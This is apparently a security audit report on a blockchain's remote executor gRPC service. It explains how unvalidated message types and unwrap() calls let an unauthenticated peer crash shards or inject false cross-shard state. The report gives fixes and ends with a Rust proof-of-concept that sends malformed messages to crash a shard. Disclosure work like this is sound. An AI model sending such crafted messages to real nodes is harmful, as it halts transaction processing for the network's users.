# Audit Report

## Title
Type Confusion in Remote Executor Cross-Shard Messaging Causes Denial of Service and Potential State Corruption

## Summary
The Remote Executor Service's gRPC message handling lacks validation between the `message_type` routing string and actual message content, allowing malicious peers to crash executor shards or inject invalid cross-shard state updates. This breaks the "Deterministic Execution" invariant and causes complete failure of sharded block execution.

## Finding Description

The vulnerability exists in the cross-shard messaging system used by the Remote Executor Service for parallel transaction execution. The attack exploits a type confusion vulnerability across three components:

**1. Unvalidated Message Routing**

The gRPC service receives `NetworkMessage` containing a `message_type` string and raw `message` bytes: [1](#0-0) 

The handler routes messages based solely on the `message_type` string without validating that the bytes match the expected type: [2](#0-1) 

**2. Unsafe Deserialization with Panics**

The receiving shard attempts to deserialize cross-shard messages with `.unwrap()`, which panics on invalid data: [3](#0-2) 

**3. Unchecked State Key Injection**

When a message is successfully deserialized, it's processed by the receiver which also uses `.unwrap()` when accessing the state key: [4](#0-3) 

**Attack Vectors:**

**Attack 1 - DoS via Invalid Bytes:**
1. Attacker identifies a remote executor shard's gRPC endpoint (configured via `--remote-executor-addresses`)
2. Attacker sends gRPC `NetworkMessage` with `message_type="cross_shard_0"` but with garbage bytes in `message` field
3. The gRPC service routes to the registered handler for "cross_shard_0"
4. `RemoteCrossShardClient::receive_cross_shard_msg()` calls `bcs::from_bytes::<CrossShardMsg>().unwrap()`
5. Deserialization fails → `.unwrap()` panics → executor shard crashes
6. Sharded execution fails completely, blocking all transaction processing

**Attack 2 - DoS via Unexpected State Key:**
1. Attacker crafts a valid `CrossShardMsg` with a `StateKey` that's not in the expected cross-shard dependency set
2. Sends message with correct `message_type`
3. Deserialization succeeds
4. `CrossShardCommitReceiver` calls `set_value()` with the unexpected key
5. `cross_shard_data.get(state_key).unwrap()` returns `None` → panic → shard crashes

**Attack 3 - State Corruption:**
1. Attacker crafts a valid `CrossShardMsg` with a legitimate `StateKey` but malicious `WriteOp` values
2. The message passes all checks and is injected into the `CrossShardStateView`
3. Transactions executing on this shard read the corrupted cross-shard state
4. Different shards may have different state views, breaking consensus determinism

The remote executor service is used in production when configured: [5](#0-4) 

## Impact Explanation

**Critical Severity** - This vulnerability qualifies for Critical severity under multiple criteria:

1. **Total loss of liveness/network availability**: When an executor shard crashes, sharded block execution cannot proceed. The system falls back to single-threaded execution or fails entirely.

2. **Consensus/Safety violations**: If malicious state values are injected, different shards execute transactions with different state views, violating the "Deterministic Execution" invariant. This could lead to state root mismatches between validators.

3. **No authentication required**: The gRPC service has no authentication or authorization. Any network peer that can reach the endpoint can exploit this vulnerability.

The cross-shard message structures are defined as: [6](#0-5) 

The receiver processes these messages in a critical execution path: [7](#0-6) 

## Likelihood Explanation

**High Likelihood** - The vulnerability is easily exploitable:

1. **No authentication**: The gRPC service accepts connections from any peer without authentication
2. **Simple attack**: Attacker only needs to send a single malformed gRPC message
3. **Public endpoints**: Remote executor addresses are configured via command-line arguments and may be exposed
4. **No rate limiting**: Multiple attacks can be launched repeatedly
5. **Production deployment**: The service is actively used when `remote_executor_addresses` are configured, as shown in the deployment entry point: [8](#0-7) 

The network controller that manages these connections is initialized without any security checks: [9](#0-8) 

## Recommendation

Implement multiple layers of defense:

**1. Add message type validation:**
```rust
// In GRPCNetworkMessageServiceServerWrapper::simple_msg_exchange
let msg = Message::new(network_message.message);
let message_type = MessageType::new(network_message.message_type);

// Validate message can be deserialized before routing
if message_type.get_type().starts_with("cross_shard_") {
    if bcs::from_bytes::<CrossShardMsg>(&msg.data).is_err() {
        return Err(Status::invalid_argument("Invalid message format"));
    }
}
```

**2. Use graceful error handling instead of unwrap():**
```rust
// In RemoteCrossShardClient::receive_cross_shard_msg
let message = rx.recv().map_err(|e| anyhow!("Channel error: {}", e))?;
let msg: CrossShardMsg = bcs::from_bytes(&message.to_bytes())
    .map_err(|e| anyhow!("Deserialization error: {}", e))?;
```

**3. Validate state keys before injection:**
```rust
// In CrossShardStateView::set_value
pub fn set_value(&self, state_key: &StateKey, state_value: Option<StateValue>) -> Result<()> {
    self.cross_shard_data
        .get(state_key)
        .ok_or_else(|| anyhow!("Unexpected state key: {:?}", state_key))?
        .set_value(state_value);
    Ok(())
}
```

**4. Add peer authentication:**
Implement mTLS or token-based authentication for the gRPC service to restrict access to authorized executor shards only.

**5. Add message envelope with checksums:**
Include a cryptographic checksum of the message bytes in the routing metadata to detect tampering.

## Proof of Concept

```rust
// PoC demonstrating the DoS attack
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tonic::Request;

#[tokio::test]
async fn test_type_confusion_dos() {
    // Connect to a remote executor shard
    let mut client = NetworkMessageServiceClient::connect("http://[SHARD_ADDRESS]")
        .await
        .unwrap();

    // Attack 1: Send garbage bytes with valid message_type
    let malicious_msg = NetworkMessage {
        message: vec![0xFF; 100], // Invalid BCS bytes
        message_type: "cross_shard_0".to_string(), // Valid routing key
    };

    // This will crash the receiving shard when it tries to deserialize
    let result = client.simple_msg_exchange(Request::new(malicious_msg)).await;
    // Shard crashes with: "thread panicked at 'called `Result::unwrap()` on an `Err`'"

    // Attack 2: Send valid CrossShardMsg with unexpected state key
    use aptos_types::state_store::state_key::StateKey;
    use aptos_vm::sharded_block_executor::messages::{CrossShardMsg, RemoteTxnWrite};
    
    let unexpected_key = StateKey::raw(b"unexpected_key");
    let malicious_msg = CrossShardMsg::RemoteTxnWriteMsg(
        RemoteTxnWrite::new(unexpected_key, None)
    );
    
    let malicious_network_msg = NetworkMessage {
        message: bcs::to_bytes(&malicious_msg).unwrap(),
        message_type: "cross_shard_0".to_string(),
    };

    // This will also crash when set_value() tries to access non-existent key
    let result = client.simple_msg_exchange(Request::new(malicious_network_msg)).await;
    // Shard crashes with: "thread panicked at 'called `Option::unwrap()` on a `None`'"
}
```

## Notes

This vulnerability specifically affects the **Remote Executor Service** used for sharded parallel execution, not the main validator consensus network which uses a different message routing system. However, when sharded execution is enabled in production (via `--remote-executor-addresses` configuration), this becomes a critical attack vector that can completely halt transaction processing.

The vulnerability demonstrates a critical pattern of trusting network input without validation, compounded by unsafe error handling practices (`.unwrap()` on untrusted data). The lack of authentication on the gRPC service means any network peer can exploit this, not just authorized executor shards.

### Citations

**File:** protos/rust/src/pb/aptos.remote_executor.v1.rs (L8-13)
```rust
pub struct NetworkMessage {
    #[prost(bytes="vec", tag="1")]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag="2")]
    pub message_type: ::prost::alloc::string::String,
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L61-66)
```rust
    fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
        let rx = self.message_rxs[current_round].lock().unwrap();
        let message = rx.recv().unwrap();
        let msg: CrossShardMsg = bcs::from_bytes(&message.to_bytes()).unwrap();
        msg
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_state_view.rs (L49-56)
```rust
    pub fn set_value(&self, state_key: &StateKey, state_value: Option<StateValue>) {
        self.cross_shard_data
            .get(state_key)
            .unwrap()
            .set_value(state_value);
        // uncomment the following line to debug waiting count
        // trace!("waiting count for shard id {} is {}", self.shard_id, self.waiting_count());
    }
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L261-267)
```rust
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/messages.rs (L7-18)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum CrossShardMsg {
    RemoteTxnWriteMsg(RemoteTxnWrite),
    StopMsg,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct RemoteTxnWrite {
    state_key: StateKey,
    // The write op is None if the transaction is aborted.
    write_op: Option<WriteOp>,
}
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L26-45)
```rust
    pub fn start<S: StateView + Sync + Send>(
        cross_shard_state_view: Arc<CrossShardStateView<S>>,
        cross_shard_client: Arc<dyn CrossShardClient>,
        round: RoundId,
    ) {
        loop {
            let msg = cross_shard_client.receive_cross_shard_msg(round);
            match msg {
                RemoteTxnWriteMsg(txn_commit_msg) => {
                    let (state_key, write_op) = txn_commit_msg.take();
                    cross_shard_state_view
                        .set_value(&state_key, write_op.and_then(|w| w.as_state_value()));
                },
                CrossShardMsg::StopMsg => {
                    trace!("Cross shard commit receiver stopped for round {}", round);
                    break;
                },
            }
        }
    }
```

**File:** execution/executor-service/src/main.rs (L9-25)
```rust
#[derive(Debug, Parser)]
struct Args {
    #[clap(long, default_value_t = 8)]
    pub num_executor_threads: usize,

    #[clap(long)]
    pub shard_id: usize,

    #[clap(long)]
    pub num_shards: usize,

    #[clap(long, num_args = 1..)]
    pub remote_executor_addresses: Vec<SocketAddr>,

    #[clap(long)]
    pub coordinator_address: SocketAddr,
}
```

**File:** secure/net/src/network_controller/mod.rs (L94-113)
```rust
impl NetworkController {
    pub fn new(service: String, listen_addr: SocketAddr, timeout_ms: u64) -> Self {
        let inbound_handler = Arc::new(Mutex::new(InboundHandler::new(
            service.clone(),
            listen_addr,
            timeout_ms,
        )));
        let outbound_handler = OutboundHandler::new(service, listen_addr, inbound_handler.clone());
        info!("Network controller created for node {}", listen_addr);
        Self {
            inbound_handler,
            outbound_handler,
            inbound_rpc_runtime: Runtime::new().unwrap(),
            outbound_rpc_runtime: Runtime::new().unwrap(),
            // we initialize the shutdown handles when we start the network controller
            inbound_server_shutdown_tx: None,
            outbound_task_shutdown_tx: None,
            listen_addr,
        }
    }
```
